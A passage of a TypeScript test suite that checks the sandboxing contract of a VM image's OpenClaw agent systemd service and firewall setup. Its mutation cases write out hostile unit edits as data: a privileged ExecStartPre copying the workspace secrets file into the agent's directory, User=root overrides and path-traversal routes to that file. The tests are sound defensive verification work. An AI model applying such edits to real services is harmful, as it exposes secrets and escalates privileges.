import { beforeAll, describe, expect, test } from 'bun:test';
import { chmod, cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { basename, join } from 'node:path';
import { tmpdir } from 'node:os';
import type { AgentUnitRequirement, BrainTierAgentProof } from '../image/verify-contract.ts';
import {
  AGENT_BRIDGE_FILES,
  AGENT_ENV_MARKER,
  AGENT_GATEWAY_CONFIG,
  AGENT_RUNTIME_CONTRACT,
  AGENT_UNIT_REQUIREMENTS,
  parseOpenclawConfigSets,
  BRAIN_TIER_AGENT_PROHIBITIONS,
  BRAIN_TIER_AGENT_PROOFS,
  parseUnitDirectives,
  PINNED_SPAN_ERROR,
  PROOF_SPAN_STRUCTURE,
  REPEATABLE_SERVICE_DIRECTIVES,
  REQUIRED_CLOUD_INIT_KEYS,
  verifyImageBundle,
} from '../image/verify-contract.ts';
import {
  AGENT_BASE_PATH,
  AGENT_CLIENT_BASE_PATH,
  AGENT_GATEWAY_PORT,
  AGENT_RUNTIME_HEALTH_PATH,
  GBRAIN_WEB_PORT,
  renderCloudInit,
} from '../src/cloud-init.ts';

const imageRoot = join(import.meta.dir, '..', 'image');

/**
 * `AGENT_UNIT_REQUIREMENTS` is `as const`, so tsc knows each field's literal
 * value and would dismiss the guards below as statically impossible. Widening
 * to the declared interface keeps them as the runtime guards they are meant to
 * be — the literal types still protect the table itself at its definition.
 */
const agentUnitRequirements: readonly AgentUnitRequirement[] = AGENT_UNIT_REQUIREMENTS;
const brainTierAgentProofs: readonly BrainTierAgentProof[] = BRAIN_TIER_AGENT_PROOFS;

/**
 * Copies the image bundle once and hands back the pristine agent unit so a
 * mutation matrix can rewrite that one file per case. `unit` is normalized to
 * LF: under a CRLF checkout a `${line}\n` replacement would silently no-op and
 * every removal case would degrade to asserting nothing.
 */
async function withAgentUnitMutations(
  run: (root: string, unitPath: string, unit: string) => Promise<void>,
): Promise<void> {
  const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
  try {
    await cp(imageRoot, root, { recursive: true });
    const unitPath = join(root, 'files', 'systemd', 'gbrain-agent.service');
    const unit = (await readFile(unitPath, 'utf8')).replace(/\r\n/g, '\n');
    await run(root, unitPath, unit);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

/**
 * The finalizer counterpart to `withAgentUnitMutations`. `finalizer` is
 * normalized to LF for the same reason: under a CRLF checkout a replacement
 * written with `\n` would silently no-op and the mutation would assert nothing.
 */
async function withFinalizerMutations(
  run: (root: string, finalizerPath: string, finalizer: string) => Promise<void>,
): Promise<void> {
  const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
  try {
    await cp(imageRoot, root, { recursive: true });
    const finalizerPath = join(root, 'files', 'bin', 'gbrain-cloud-init-finalize');
    const finalizer = (await readFile(finalizerPath, 'utf8')).replace(/\r\n/g, '\n');
    await run(root, finalizerPath, finalizer);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

/** Cuts `[start, end]` out of the finalizer and re-inserts it after `anchor`. */
function relocate(finalizer: string, start: string, end: string, anchor: string): string {
  const from = finalizer.indexOf(start);
  const to = finalizer.indexOf(end);
  if (from < 0 || to < 0) throw new Error(`relocation bounds not found: ${start} .. ${end}`);
  const block = finalizer.slice(from, to + end.length);
  const without = `${finalizer.slice(0, from)}${finalizer.slice(to + end.length)}`;
  if (!without.includes(anchor)) throw new Error(`relocation anchor not found: ${anchor}`);
  return without.replace(anchor, `${anchor}${block}`);
}

function bashPath(path: string): string {
  if (process.platform !== 'win32') return path;
  return path
    .replace(/^([A-Za-z]):/, (_, drive: string) => `/mnt/${drive.toLowerCase()}`)
    .replaceAll('\\', '/');
}

async function validateCloudInitEnvironment(
  contents: string,
  mode = 0o600,
  forbiddenPath?: string,
) {
  const root = await mkdtemp(join(tmpdir(), 'gbrain-cloud-init-'));
  const envFile = join(root, 'workspace.env');
  await writeFile(envFile, contents);
  await chmod(envFile, mode);

  const finalizer = bashPath(
    join(imageRoot, 'files', 'bin', 'gbrain-cloud-init-finalize'),
  );
  const wslEnvFile = `/tmp/${basename(root)}.env`;
  const forbiddenSetup = forbiddenPath
    ? `rm -f '${forbiddenPath}'; `
    : '';
  const forbiddenCheck = forbiddenPath
    ? `; test ! -e '${forbiddenPath}'`
    : '';
  const cleanupPaths = forbiddenPath
    ? `"${wslEnvFile}" "${forbiddenPath}"`
    : `"${wslEnvFile}"`;
  const command =
    process.platform === 'win32'
      ? `set -e; ${forbiddenSetup}trap 'rm -f ${cleanupPaths}' EXIT; install -m ${mode
          .toString(8)
          .padStart(4, '0')} '${bashPath(
          envFile,
        )}' '${wslEnvFile}'; GBRAIN_ENV_FILE='${wslEnvFile}' '${finalizer}' --validate-only${forbiddenCheck}`
      : forbiddenPath
        ? `set -e; ${forbiddenSetup}trap 'rm -f "${forbiddenPath}"' EXIT; GBRAIN_ENV_FILE='${envFile}' '${finalizer}' --validate-only${forbiddenCheck}`
        : `GBRAIN_ENV_FILE='${envFile}' '${finalizer}' --validate-only`;

  const shell =
    process.platform === 'win32'
      ? ['wsl.exe', '-e', 'bash', '-c', command]
      : ['bash', '-c', command];
  const child = Bun.spawn(shell, {
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [exitCode, stdout, stderr] = await Promise.all([
    child.exited,
    new Response(child.stdout).text(),
    new Response(child.stderr).text(),
  ]);
  await rm(root, { recursive: true, force: true });
  return { exitCode, stdout, stderr };
}

async function exerciseAptRetry(
  provision: string,
  fakeApt: string,
  waitSeconds = 2,
) {
  const root = await mkdtemp(join(tmpdir(), 'gbrain-apt-retry-'));
  const helperPath = join(root, 'apt-helper.sh');
  const helper = provision.match(
    /APT_LOCK_WAIT_SECONDS=.*\nAPT_LOCK_RETRY_SECONDS=.*\n\nrun_apt\(\) \{[\s\S]*?^\}/m,
  )?.[0];
  expect(helper).toBeDefined();

  await Bun.write(helperPath, `${helper}\n`);
  const encodedFakeApt = Buffer.from(fakeApt).toString('base64');

  const command = `set +e
fake_dir=$(mktemp -d)
trap 'rm -rf "$fake_dir"' EXIT
printf '%s' '${encodedFakeApt}' | base64 -d >"$fake_dir/apt-get"
chmod +x "$fake_dir/apt-get"
export PATH="$fake_dir:$PATH"
export APT_LOCK_WAIT_SECONDS='${waitSeconds}'
export APT_LOCK_RETRY_SECONDS=0
export APT_TEST_COUNT="$fake_dir/count"
source '${bashPath(helperPath)}'
run_apt update
status=$?
count=$(cat "$fake_dir/count")
printf 'status=%s count=%s\\n' "$status" "$count"`;
  const shell =
    process.platform === 'win32'
      ? ['wsl.exe', '-e', 'bash', '-c', command]
      : ['bash', '-c', command];
  const child = Bun.spawn(shell, {
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [exitCode, stdout, stderr] = await Promise.all([
    child.exited,
    new Response(child.stdout).text(),
    new Response(child.stderr).text(),
  ]);
  await rm(root, { recursive: true, force: true });
  return { exitCode, stdout, stderr };
}

const validCloudInitEnvironment = `
GBRAIN_WORKSPACE_NAME="Acme Example Workspace"
GBRAIN_SUBDOMAIN=acme-example.workspaces.example.com
GBRAIN_WORKSPACE_BASE_URL=https://acme-example.workspaces.example.com
GBRAIN_WORKSPACE_TOKEN_SECRET=token-secret-example
GBRAIN_BOOTSTRAP_CREDENTIAL=bootstrap-credential-example
GBRAIN_EMAIL_RESEND_API_KEY=resend-key-example
GBRAIN_EMAIL_FROM="2Brain <no-reply@workspaces.example.com>"
OPENROUTER_API_KEY=openrouter-key-example
GBRAIN_EMBEDDING_MODEL=openrouter:openai/text-embedding-3-small
GBRAIN_EMBEDDING_DIMENSIONS=1536
GBRAIN_DATABASE_URL=postgresql://gbrain:password-example@127.0.0.1:5432/gbrain
TWO_BRAIN_DATABASE_URL=postgresql://gbrain:password-example@127.0.0.1:5432/gbrain
`;

describe('workspace VM image contract', () => {
  test('provisioning installs the exact integrity-verified OpenClaw runtime', async () => {
    const provision = await readFile(join(imageRoot, 'scripts', 'provision.sh'), 'utf8');
    const launcher = await readFile(join(imageRoot, 'files', 'bin', 'openclaw'), 'utf8');

    expect(provision).toContain('NODE_VERSION="24.15.0"');
    expect(provision).toContain(
      'NODE_SHA256="f3d5a797b5d210ce8e2cb265544c8e482eaedcb8aa409a8b46da7e8595d0dda0"',
    );
    expect(provision).toContain('sha256sum --check');
    expect(provision).toContain('npm ci --omit=dev --no-audit --no-fund');
    expect(provision).toContain("require('/opt/openclaw/node_modules/openclaw/package.json').version");
    expect(provision).toContain('expected OpenClaw 2026.7.1-2');
    expect(launcher).toContain('/opt/node-v24.15.0/bin/node');
    expect(launcher).toContain('/opt/openclaw/node_modules/openclaw/openclaw.mjs');
    expect(launcher).not.toContain('/usr/bin/env node');
  });

  test('provisioning creates a separate OpenClaw identity and bounded filesystem', async () => {
    const provision = await readFile(join(imageRoot, 'scripts', 'provision.sh'), 'utf8');

    expect(provision).toContain('groupadd --system openclaw');
    expect(provision).toContain(
      'useradd --system --gid openclaw --home-dir /var/lib/openclaw',
    );
    expect(provision).toContain('--shell /usr/sbin/nologin openclaw');
    expect(provision).toContain('for prohibited_group in gbrain sudo; do');
    expect(provision).toContain(
      'getent passwd openclaw | cut -d: -f7)" != "/usr/sbin/nologin"',
    );
    expect(provision).toContain('openclaw_uid="$(id -u openclaw)"');
    expect(provision).toContain('openclaw_primary_group="$(id -gn openclaw)"');
    expect(provision).toContain('openclaw_primary_gid="$(getent group "$openclaw_primary_group" | cut -d: -f3)"');
    expect(provision).toContain(
      'getent passwd openclaw | cut -d: -f6)" != "/var/lib/openclaw"',
    );
    expect(provision).toContain('openclaw_groups="$(id -nG openclaw)"');
    expect(provision).toContain('if [[ "$openclaw_groups" != "openclaw" ]]; then');
    expect(provision).not.toMatch(/usermod[\s\S]*-aG[\s\S]*gbrain[\s\S]*openclaw/);
    expect(provision).toContain('OPENCLAW_STORAGE_BYTES=$((10 * 1024 * 1024 * 1024))');
    expect(provision).toContain('mkfs.ext4 -F -L openclaw-state');
    expect(provision).toContain(
      '/var/lib/openclaw.img /var/lib/openclaw ext4 loop,nodev,nosuid 0 2',
    );
    expect(provision).toContain('/var/lib/openclaw/.openclaw');
    expect(provision).toContain('/var/lib/openclaw/browser');
    expect(provision).toContain('/var/lib/openclaw/workspace');
    expect(provision).toContain('ln -sfn ../browser /var/lib/openclaw/.openclaw/browser');
    expect(provision).toContain('/etc/openclaw');
    expect(provision).toContain(
      'iptables -C OUTPUT -m owner --uid-owner openclaw -p tcp --dport 5432 -d 127.0.0.0/8 -j REJECT',
    );
    expect(provision).toContain(
      'ip6tables -C OUTPUT -m owner --uid-owner openclaw -p tcp --dport 5432 -d ::1/128 -j REJECT',
    );
  });

  // Substring smoke check mandated by the plan; the verifier's section-aware
  // exact-value checks below are the authoritative ones.
  test('the inert agent unit enforces identity, secret, filesystem, and resource boundaries', async () => {
    const unit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );

    for (const line of [
      'User=openclaw',
      'Group=openclaw',
      'WorkingDirectory=/var/lib/openclaw/workspace',
      'Environment=HOME=/var/lib/openclaw',
      'Environment=OPENCLAW_HOME=/var/lib/openclaw',
      'Environment=OPENCLAW_STATE_DIR=/var/lib/openclaw/.openclaw',
      'Environment=OPENCLAW_WORKSPACE_DIR=/var/lib/openclaw/workspace',
      'EnvironmentFile=/etc/openclaw/agent.env',
      'RequiresMountsFor=/var/lib/openclaw',
      'CapabilityBoundingSet=',
      'AmbientCapabilities=',
      'ProtectSystem=strict',
      'PrivateDevices=true',
      'ProtectProc=invisible',
      'ProcSubset=pid',
      'CPUQuota=150%',
      'MemoryHigh=2G',
      'MemoryMax=3G',
      'TasksMax=512',
      'CPUWeight=25',
      'IOWeight=25',
      'OOMScoreAdjust=750',
      'LogRateLimitIntervalSec=30s',
      'LogRateLimitBurst=200',
    ]) {
      expect(unit).toContain(line);
    }
    expect(unit).not.toContain('User=gbrain');
    expect(unit).not.toContain('EnvironmentFile=/etc/gbrain/workspace.env');
    expect(unit).toContain(
      'ReadWritePaths=/var/lib/openclaw/.openclaw /var/lib/openclaw/browser /var/lib/openclaw/workspace',
    );
    expect(unit).toContain(
      'InaccessiblePaths=-/etc/gbrain -/var/lib/gbrain -/opt/gbrain -/usr/local/bin/gbrain -/var/lib/postgresql -/run/postgresql',
    );
    expect(unit).toContain('-/run/docker.sock -/var/run/docker.sock');
    expect(unit).toContain('-/run/systemd/private -/run/systemd/io.systemd.Manager -/run/dbus/system_bus_socket');
    expect(unit).toContain('TemporaryFileSystem=/tmp:rw,nosuid,nodev,size=256M,mode=1777');
    expect(unit).toContain('TemporaryFileSystem=/var/tmp:rw,nosuid,nodev,size=256M,mode=1777');
  });

  /**
   * systemd refuses to start a unit whose namespace names a path that does not
   * exist, unless the entry is prefixed with `-`. `/run/docker.sock` is never
   * created on this image — Docker is deliberately absent — so the unprefixed
   * form made every launch fail `status=226/NAMESPACE` in a restart loop, and
   * OpenClaw never ran on a real VM. Reading the unit as text could not see it.
   *
   * The rule is all-or-nothing on purpose: `-` costs nothing when the path DOES
   * exist (it is still made inaccessible), so a per-path judgement about what
   * the image happens to create today is exactly the reasoning that failed here.
   */
  test('every inaccessible path tolerates its own absence', async () => {
    const unit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );
    const directives = parseUnitDirectives(unit).filter(
      entry => entry.key === 'InaccessiblePaths',
    );
    expect(directives.length).toBeGreaterThan(0);

    const unprefixed = directives
      .flatMap(entry => entry.value.split(/\s+/))
      .filter(path => path.length > 0 && !path.startsWith('-'));

    expect(unprefixed).toEqual([]);
  });

  /**
   * systemd assembles a unit's own namespace under `/run/systemd`, so masking
   * that directory fails the namespace outright — and because it is the last
   * mount applied, it fails with no message at all, leaving only a bare
   * `status=226/NAMESPACE` restart loop to debug. The two manager control
   * sockets are what the block is actually for, and naming them individually
   * blocks the same escape while leaving the namespace buildable (both were
   * confirmed mode 0 inside the running service's namespace on a real VM).
   */
  test('the service manager is blocked by socket, never by masking /run/systemd', async () => {
    const unit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );
    const paths = parseUnitDirectives(unit)
      .filter(entry => entry.key === 'InaccessiblePaths')
      .flatMap(entry => entry.value.split(/\s+/))
      .map(path => path.replace(/^-/, ''))
      .filter(path => path.length > 0);

    expect(paths).not.toContain('/run/systemd');
    expect(paths).not.toContain('/run/systemd/');
    expect(paths).toContain('/run/systemd/private');
    expect(paths).toContain('/run/systemd/io.systemd.Manager');
  });

  /**
   * A tmpfs takes systemd's root-owned 0755 default unless the mount options
   * say otherwise, and the agent runs unprivileged: OpenClaw could not create
   * its temp directory and exited 1 on every start. A private /tmp the service
   * cannot write to is an outage, not isolation.
   */
  test('every private temporary filesystem is writable by the agent identity', async () => {
    const unit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );
    const mounts = parseUnitDirectives(unit).filter(
      entry => entry.key === 'TemporaryFileSystem',
    );
    expect(mounts.length).toBeGreaterThan(0);

    for (const mount of mounts) {
      expect(
        mount.value.split(',').map(option => option.trim()),
        `TemporaryFileSystem=${mount.value} is not writable by the agent identity`,
      ).toContain('mode=1777');
    }
  });

  /**
   * `openclaw gateway` already runs in the foreground. The pinned release
   * rejects `--foreground` outright ("OpenClaw does not recognize option"),
   * which shipped as a permanent restart loop, so the command line is held to
   * the flags 2026.7.1-2 actually documents rather than to plausible ones.
   */
  test('the agent unit runs the pinned OpenClaw gateway with no invented flags', async () => {
    const unit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );
    const execStarts = parseUnitDirectives(unit)
      .filter(entry => entry.key === 'ExecStart')
      .map(entry => entry.value);

    expect(execStarts).toEqual(['/usr/local/bin/openclaw gateway']);
    expect(unit).not.toContain('--foreground');
  });

  test('the exported agent unit contract pins the plan-mandated boundaries', () => {
    const declared = agentUnitRequirements.map(
      ({ directive, value, message }) => `${directive}=${value} ${message}`,
    );
    // The plan pins these exact pairs; the mutation matrices below derive from
    // the same table, so this guards it against silent message drift.
    for (const [declaration, message] of [
      ['User=openclaw', 'gbrain-agent.service must run as openclaw'],
      [
        'EnvironmentFile=/etc/openclaw/agent.env',
        'gbrain-agent.service must consume only the agent-scoped environment',
      ],
      ['CapabilityBoundingSet=', 'gbrain-agent.service must have no Linux capabilities'],
      ['MemoryMax=3G', 'gbrain-agent.service must cap memory at 3G'],
      [
        'ReadWritePaths=/var/lib/openclaw/.openclaw /var/lib/openclaw/browser /var/lib/openclaw/workspace',
        'gbrain-agent.service must confine persistent writes to agent-owned paths',
      ],
    ]) {
      expect(declared).toContain(`${declaration} ${message}`);
    }
    // Availability semantics carry the same cardinality rule as the sandbox
    // directives, so Type=oneshot or RestartSec=0 cannot be appended.
    const pinnedOnce = agentUnitRequirements.filter(
      ({ cardinality }) => cardinality === 'once',
    ).map(({ directive }) => directive);
    for (const directive of ['Type', 'Restart', 'RestartSec', 'TimeoutStopSec']) {
      expect(pinnedOnce).toContain(directive);
    }
    // Exact counts, not a floor: shrinking the table must require a deliberate
    // edit here rather than silently reducing what the matrices below cover.
    expect(agentUnitRequirements.length).toBe(42);
    expect(pinnedOnce.length).toBe(39);
  });

  test('no [Service] directive may opt out of the cardinality check unreviewed', () => {
    // Flipping a row to 'any' disables its cardinality check AND drops it from
    // the derived re-assignment matrix — the one field whose corruption is
    // otherwise silent. Opting out must be a reviewed allowlist entry.
    expect(
      agentUnitRequirements.filter(
        ({ section, cardinality }) => section === 'Service' && cardinality === 'any',
      ).map(({ directive }) => directive),
    ).toEqual([...REPEATABLE_SERVICE_DIRECTIVES]);
  });

  test('every [Service] directive the agent unit ships is pinned by the table', async () => {
    // Guards the unit -> table direction: a directive added to the unit with no
    // table row would ship unpinned and could later be removed undetected.
    const setChecked = new Set(['Environment', 'TemporaryFileSystem']);
    const pinned = new Set(
      agentUnitRequirements.filter(({ section }) => section === 'Service').map(
        ({ directive }) => directive,
      ),
    );
    const unit = await readFile(
      join(imageRoot, 'files', 'systemd', 'gbrain-agent.service'),
      'utf8',
    );
    const shipped = parseUnitDirectives(unit)
      .filter(({ section }) => section === 'Service')
      .map(({ key }) => key);

    expect(
      [...new Set(shipped)].filter(key => !pinned.has(key) && !setChecked.has(key)),
    ).toEqual([]);
  });

  test('the verifier rejects every pinned agent directive being removed', async () => {
    await withAgentUnitMutations(async (root, unitPath, unit) => {
      for (const { directive, value, message } of agentUnitRequirements) {
        // Anchored on both sides so a record whose declaration is a substring of
        // another line's value cannot mutate the wrong line.
        await writeFile(unitPath, unit.replace(`\n${directive}=${value}\n`, '\n'));

        const report = await verifyImageBundle(root);
        expect(report.errors).toContain(message);
      }
    });
  });

  test('the verifier rejects every pinned agent directive being re-assigned', async () => {
    await withAgentUnitMutations(async (root, unitPath, unit) => {
      const pinnedOnce = agentUnitRequirements.filter(
        ({ cardinality }) => cardinality === 'once',
      );
      for (const { directive } of pinnedOnce) {
        // systemd applies the LAST assignment, so appending inside [Service]
        // silently overrides the hardened value.
        await writeFile(
          unitPath,
          unit.replace('\n[Install]', `\n${directive}=weakened\n[Install]`),
        );

        const report = await verifyImageBundle(root);
        expect(report.errors).toContain(
          `gbrain-agent.service must assign ${directive} exactly once`,
        );
      }
    });
  });

  test('the verifier rejects agent service boundaries weakened by addition', async () => {
    // Only cases whose expected error differs from the derived cardinality
    // message are listed by hand.
    const mutations = [
      ['User=gbrain', 'gbrain-agent.service must never share the GBrain service identity'],
      ['Group=gbrain', 'gbrain-agent.service must never share the GBrain service identity'],
      // systemd merges repeated section headers, so a second [Service] block
      // overrides the first just as an appended line does.
      ['[Service]\nUser=root', 'gbrain-agent.service must assign User exactly once'],
      [
        'EnvironmentFile=-/etc/gbrain/workspace.env',
        'gbrain-agent.service must never inherit the Workspace environment',
      ],
      [
        'EnvironmentFile=+/var/lib/gbrain/workspace.env',
        'gbrain-agent.service must never inherit the Workspace environment',
      ],
      [
        'EnvironmentFile="-/opt/gbrain/workspace.env"',
        'gbrain-agent.service must never inherit the Workspace environment',
      ],
      [
        'ExecStartPre=+/bin/cp /etc/gbrain/workspace.env /var/lib/openclaw/',
        'gbrain-agent.service must declare no ExecStartPre directive',
      ],
      ['ExecStartPost=/bin/true', 'gbrain-agent.service must declare no ExecStartPost directive'],
      ['ExecStopPost=/bin/true', 'gbrain-agent.service must declare no ExecStopPost directive'],
      ['ExecReload=/bin/true', 'gbrain-agent.service must declare no ExecReload directive'],
      ['ExecCondition=/bin/true', 'gbrain-agent.service must declare no ExecCondition directive'],
      [
        'ExecStop=/bin/sh -c "id > /tmp/whoami"',
        'gbrain-agent.service must declare no ExecStop directive',
      ],
      [
        'ExecStop=+/bin/cp /etc/gbrain/workspace.env /var/lib/openclaw/',
        'gbrain-agent.service must never run exec directives with elevated privileges',
      ],
      [
        'MemoryDenyWriteExecute=yes',
        'gbrain-agent.service must not set MemoryDenyWriteExecute; the Node runtime requires JIT pages',
      ],
      [
        'RestrictNamespaces=~CLONE_NEWUSER',
        'gbrain-agent.service must not set RestrictNamespaces; the managed browser requires user namespaces',
      ],
      [
        'Environment=OPENCLAW_STATE_DIR=/etc/gbrain',
        'gbrain-agent.service must declare exactly the agent-scoped environment variables',
      ],
      [
        'TemporaryFileSystem=/etc/gbrain:rw',
        'gbrain-agent.service must declare exactly the bounded temporary filesystems',
      ],
      // systemd strips whitespace around BOTH the key and the value, so padding
      // before the `=` is a valid assignment rather than an inert line.
      ['User = root', 'gbrain-agent.service must assign User exactly once'],
      ['User =root', 'gbrain-agent.service must assign User exactly once'],
      ['User=\troot', 'gbrain-agent.service must assign User exactly once'],
      ['   Group = root   ', 'gbrain-agent.service must assign Group exactly once'],
      ['TasksMax = infinity', 'gbrain-agent.service must assign TasksMax exactly once'],
      [
        'ExecStartPre = +/bin/cp /etc/gbrain/workspace.env /var/lib/openclaw/',
        'gbrain-agent.service must declare no ExecStartPre directive',
      ],
      [
        'ExecStartPre = +/bin/cp /etc/gbrain/workspace.env /var/lib/openclaw/',
        'gbrain-agent.service must never run exec directives with elevated privileges',
      ],
      [
        'EnvironmentFile = /etc/gbrain/workspace.env',
        'gbrain-agent.service must never inherit the Workspace environment',
      ],
      [
        'MemoryDenyWriteExecute = yes',
        'gbrain-agent.service must not set MemoryDenyWriteExecute; the Node runtime requires JIT pages',
      ],
      [
        'RestrictNamespaces = ~CLONE_NEWUSER',
        'gbrain-agent.service must not set RestrictNamespaces; the managed browser requires user namespaces',
      ],
      [
        'Environment = OPENCLAW_STATE_DIR=/etc/gbrain',
        'gbrain-agent.service must declare exactly the agent-scoped environment variables',
      ],
    ] as const;

    await withAgentUnitMutations(async (root, unitPath, unit) => {
      for (const [addedLine, expectedError] of mutations) {
        await writeFile(unitPath, unit.replace('\n[Install]', `\n${addedLine}\n[Install]`));

        const report = await verifyImageBundle(root);
        expect(report.errors).toContain(expectedError);
      }
    });
  });

  test('the verifier rejects pinned agent directives relocated out of their section', async () => {
    // systemd ignores an unknown key in [Unit]/[Install] and still loads the
    // unit, so relocating a pinned directive silently drops the boundary.
    const relocations = [
      ['User=openclaw', '[Unit]', '', 'gbrain-agent.service must run as openclaw'],
      [
        'CapabilityBoundingSet=',
        '[Unit]',
        'CapabilityBoundingSet=CAP_SYS_ADMIN',
        'gbrain-agent.service must have no Linux capabilities',
      ],
      [
        'ProtectSystem=strict',
        '[Unit]',
        '',
        'gbrain-agent.service must keep the system read-only',
      ],
      [
        'InaccessiblePaths=-/etc/gbrain -/var/lib/gbrain -/opt/gbrain -/usr/local/bin/gbrain -/var/lib/postgresql -/run/postgresql -/run/docker.sock -/var/run/docker.sock -/run/systemd/private -/run/systemd/io.systemd.Manager -/run/dbus/system_bus_socket',
        '[Install]',
        '',
        'gbrain-agent.service must block GBrain, PostgreSQL, Docker, and service manager paths',
      ],
      [
        'EnvironmentFile=/etc/openclaw/agent.env',
        '[Unit]',
        '',
        'gbrain-agent.service must consume only the agent-scoped environment',
      ],
      [
        'ReadWritePaths=/var/lib/openclaw/.openclaw /var/lib/openclaw/browser /var/lib/openclaw/workspace',
        '[Install]',
        'ReadWritePaths=/etc/gbrain /var/lib/gbrain',
        'gbrain-agent.service must confine persistent writes to agent-owned paths',
      ],
    ] as const;

    for (const [movedLine, targetSection, replacement, expectedError] of relocations) {
      const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
      try {
        await cp(imageRoot, root, { recursive: true });
        const unitPath = join(root, 'files', 'systemd', 'gbrain-agent.service');
        const unit = await readFile(unitPath, 'utf8');
        let mutated = unit.replace(`${movedLine}\n`, '');
        mutated = mutated.replace(`${targetSection}\n`, `${targetSection}\n${movedLine}\n`);
        if (replacement) {
          mutated = mutated.replace('\n[Install]', `\n${replacement}\n[Install]`);
        }
        await writeFile(unitPath, mutated);

        const report = await verifyImageBundle(root);
        expect(report.errors).toContain(expectedError);
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    }
  });

  test('the verifier resolves obfuscated Workspace environment paths', async () => {
    // Replacing (not appending) the agent EnvironmentFile leaves exactly one
    // assignment, so only path resolution can catch these.
    for (const obfuscated of [
      '/etc//gbrain/workspace.env',
      '/etc/./gbrain/workspace.env',
      '/var/lib//gbrain/workspace.env',
      '/etc/openclaw/../gbrain/workspace.env',
    ]) {
      const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
      try {
        await cp(imageRoot, root, { recursive: true });
        const unitPath = join(root, 'files', 'systemd', 'gbrain-agent.service');
        const unit = await readFile(unitPath, 'utf8');
        await writeFile(
          unitPath,
          unit.replace(
            'EnvironmentFile=/etc/openclaw/agent.env',
            `EnvironmentFile=${obfuscated}`,
          ),
        );

        const report = await verifyImageBundle(root);
        expect(report.errors).toContain(
          'gbrain-agent.service must never inherit the Workspace environment',
        );
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    }
  });

  test('the verifier accepts cosmetic agent unit rewrites', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const unitPath = join(root, 'files', 'systemd', 'gbrain-agent.service');
      const unit = await readFile(unitPath, 'utf8');
      const cosmetic = unit
        .replace(
          'Environment=HOME=/var/lib/openclaw\nEnvironment=OPENCLAW_HOME=/var/lib/openclaw\n',
          'Environment=OPENCLAW_HOME=/var/lib/openclaw\n\n# reordered on purpose\nEnvironment=HOME=/var/lib/openclaw\n',
        )
        .replace(
          'TemporaryFileSystem=/tmp:rw,nosuid,nodev,size=256M,mode=1777\nTemporaryFileSystem=/var/tmp:rw,nosuid,nodev,size=256M,mode=1777\n',
          'TemporaryFileSystem=/var/tmp:rw,nosuid,nodev,size=256M,mode=1777\n; a semicolon comment\n\nTemporaryFileSystem=/tmp:rw,nosuid,nodev,size=256M,mode=1777\n',
        )
        .replace('[Service]\n', '[Service]\n\n');
      await writeFile(unitPath, cosmetic);

      const report = await verifyImageBundle(root);
      expect(report.errors).toEqual([]);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects agent service drop-in overrides', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const dropIn = join(root, 'files', 'systemd', 'gbrain-agent.service.d');
      await mkdir(dropIn, { recursive: true });
      await writeFile(join(dropIn, 'override.conf'), '[Service]\nUser=root\n');

      const report = await verifyImageBundle(root);
      expect(report.errors).toContain('gbrain-agent.service must have no drop-in overrides');
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects storage that can expose device nodes', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const provisionPath = join(root, 'scripts', 'provision.sh');
      const provision = await readFile(provisionPath, 'utf8');
      await writeFile(
        provisionPath,
        provision.replace(
          '/var/lib/openclaw ext4 loop,nodev,nosuid 0 2',
          '/var/lib/openclaw ext4 loop,nosuid 0 2',
        ),
      );

      const report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'OpenClaw persistent storage must be a 10 GiB nodev,nosuid ext4 loop filesystem',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects missing OpenClaw sudo and non-login identity checks', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const provisionPath = join(root, 'scripts', 'provision.sh');
      const provision = await readFile(provisionPath, 'utf8');

      await writeFile(
        provisionPath,
        provision.replace(
          'for prohibited_group in gbrain sudo; do',
          'for prohibited_group in gbrain; do',
        ),
      );
      let report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must fail if openclaw joins the sudo group',
      );

      await writeFile(
        provisionPath,
        provision.replace(
          `if [[ "$(getent passwd openclaw | cut -d: -f7)" != "/usr/sbin/nologin" ]]; then
  echo "openclaw must use the non-login shell /usr/sbin/nologin" >&2
  exit 2
fi
`,
          '',
        ),
      );
      report = await verifyImageBundle(root);
      expect(report.errors).toContain(
        'provision.sh must fail unless openclaw uses /usr/sbin/nologin',
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  test('the verifier rejects unsafe OpenClaw UID, primary group, and home checks', async () => {
    const root = await mkdtemp(join(tmpdir(), 'gbrain-image-contract-'));
    try {
      await cp(imageRoot, root, { recursive: true });
      const provisionPath = join(root, 'scripts', 'provision.sh');
      const provision = await readFile(provisionPath, 'utf8');

      await writeFile(
        provisionPath,
        provision.replace(
          `if [[ "$openclaw_uid" -eq 0 || "$openclaw_uid" -lt 100 || "$openclaw_uid" -gt 999 ]]; then
